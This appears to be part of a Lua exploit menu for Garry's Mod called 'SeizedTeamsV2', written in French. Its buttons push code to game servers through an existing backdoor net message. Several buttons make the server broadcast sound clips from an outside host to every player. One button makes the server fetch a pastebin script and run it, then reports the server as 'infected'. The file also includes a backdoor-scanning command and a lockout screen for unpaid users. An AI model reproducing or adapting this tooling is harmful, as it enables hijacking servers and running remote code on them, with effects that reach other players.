local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 720 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Rire" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Rire.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 750 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Starfoullah" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/STARFOULLAH%20THEKAIRI78!.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 780 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Sale batard 1" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Sale%20Batard%20(2).mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 810 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Sale batard 2" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Sale%20Batard.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 840 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Insulte" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/THEKAIRI78%20INSULTE.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 870 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Ta 28 ans" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Ta%2028%20Ans.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 900 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - pokemon 1" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/pokemon%20musique.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 930 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - pokemon 2" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/pokemon%20musique%202.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 960 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - rire 2" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/rire2.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 990 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - rire 3" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/rire%203.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 1020 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - rire 4" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/rire4.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 1050 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - tk d�foncer" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/tk%20d%C3%A9foncer.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 280 )
		Macro:SetParent(Controller)
        Macro:SetText( "R�cup le CFG" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(51, 255, 51)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
RunConsoleCommand( "SeizedTeamlebg" ) -- What happens when you press the button 
SploitNotify("check la console ma poule")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "check la console ma poule" )
surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 250 )
		Macro:SetParent(Controller)
        Macro:SetText( "Envoyer le CFG" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(184, 134, 11)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/trJwsWcY\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Serveur infect� avec succ�s ! :D Clique sur 'R�cup le CFG' " )
    SploitNotify("Serveur infect� avec succ�s !")
    surface.PlaySound("buttons/blip1.wav") 
end







------------------------------
--     OPEN SeizedTeam MENU      --
------------------------------
surface.PlaySound("buttons/blip1.wav")
SploitNotify("Bienvenue sur le  SeizedTeamsV2 " .. ply:GetName())

---------------------------------
end
concommand.Add("SeizedTeam_menu", Jesus)
concommand.Add("jesus_scanbd", checkbackdoors)
----------------------------------

else -- if steamid isn't authorized

surface.CreateFont( "PopupHFont", {
    font = "Segoe UI Light",
    size = 50,
    weight = 1000,
})

surface.CreateFont("PopupFont", {
    font = "Segoe UI Light",
    size = 21,
    weight = 300
})

concommand.Add("fucked", function()
    local Popup = vgui.Create("DFrame")
        Popup:SetSize( ScrW(), ScrH() )
        Popup:SetPos( 0,0 )
        Popup:SetVisible( true )
        Popup:SetDraggable( false )
        Popup:SetTitle( "" )
        Popup:MakePopup()
        Popup:ShowCloseButton( false )
        Popup.Paint = function(s,w,h) 
        surface.SetDrawColor( Color(0,0,0,200) ) 
        surface.DrawRect( 0,0, w,h ) 
        surface.SetDrawColor( Color(240,0,0) )
        surface.DrawRect( 0, w/2-Popup:GetTall()/1.520, ScrW(), ScrH()/6.5 )
        surface.SetTextColor(255,255,255) 
        surface.SetTextPos(w/5.10, h/2.40)
            surface.SetFont("PopupHFont")
            surface.SetTextPos(w/5.10, h/3)
            surface.DrawText("Erreur")
            surface.SetFont("PopupFont") 
            surface.SetTextPos(w/5.10, h/2.50)
            surface.DrawText( "Tu n'as acheter le SeizedTeamsV2," )
            surface.SetTextPos(w/5.10, h/2.40)              
            surface.DrawText( "donc tu ne peux pas l'utiliser." )
            surface.SetTextPos(w/5.10, h/2.30)
            surface.DrawText("Merci de contacter SeizedTeamsV2 .")
    end 
    button = vgui.Create("DButton", Popup)
    button:SetSize(110,32.5)
    button:SetPos(Popup:GetWide()/2+Popup:GetWide()/10, Popup:GetTall()/2.050)
    button:SetText("")
    button.Paint = function(s,w,h) 
        surface.SetDrawColor( Color(255,255,255) ) 
        surface.DrawRect( 0,0, w,h ) 
        surface.SetDrawColor( Color(80,180,240) ) 
        surface.DrawRect( 0+3,0+3, w-6,h-6 ) 
        surface.SetTextColor(255,255,255) 
        surface.SetFont("PopupFont") 
        surface.SetTextPos(24,5.5) 
        surface.DrawText( "Continue" ) 
    end 
    button.DoClick = function(s,w,h) 
        Popup:Close()
    end
	
end) 
RunConsoleCommand("fucked")
end